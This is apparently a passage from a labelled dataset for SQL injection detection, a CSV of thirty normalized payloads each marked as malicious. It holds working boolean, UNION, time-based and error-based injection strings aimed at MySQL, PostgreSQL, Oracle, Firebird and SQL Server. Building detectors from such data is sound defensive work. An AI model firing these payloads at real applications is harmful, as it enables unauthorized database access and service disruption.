row_index,payload_norm,label,sqli_type_hint
6750,"1%' ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( '%' = '",1,
6751,1' ) ) as pdcl where 6964 = 6964,1,
6752,"-9504%"" ) ) or 8098 = 7472",1,
6753,"-1956"" ) where 1448 = 1448 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,
6754,1%' ) and 4595 = 4595#,1,
6755,1 ) where 9649 = 9649 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
6756,"1 and make_set ( 8403 = 8403,8899 ) -- rbxf",1,
6757,"1"" and make_set ( 4214 = 9503,9503 ) and ""phjg"" like ""phjg",1,
6758,1%' ) union all select null--,1,
6759,"1' or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,
6760,"-6527' ) ) union all select 5053,5053,5053,5053--",1,
6761,1' where 8864 = 8864,1,
6762,"1 ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 5132 = 5132",1,
6763,1' ) ) union all select null--,1,
6764,select case when 2095 = 9074 then 1 else null end--,1,
6765,1'|| ( select 'qstz' where 6835 = 6835,1,
6766,-4961' ) or 3038 = 3038,1,
6767,"-8824%' ) ) or make_set ( 9354 = 9354,7185 ) and ( ( '%' = '",1,
6768,"1' ) where 6214 = 6214 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
6769,"1"" ) ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( ""uzjn"" = ""uzjn",1,
6770,"1'|| ( select 'osux' from dual where 7066 = 7066 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",1,
6771,"1%' ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6772,"1"" union all select null,null,null,null,null,null,null,null,null,null#",1,
6773,"1%"" ) and sleep ( 5 ) and ( ""%"" = """,1,
6774,"-5911 union all select 2245,2245,2245,2245,2245,2245#",1,
6775,"1'|| ( select 'scba' where 9079 = 9079 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
6776,-8099%' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = ',1,
6777,"-3733' ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'ybgd' = 'ybgd",1,
6778,"1"" ) where 5197 = 5197 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
6779,1' in boolean mode ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) #,1,
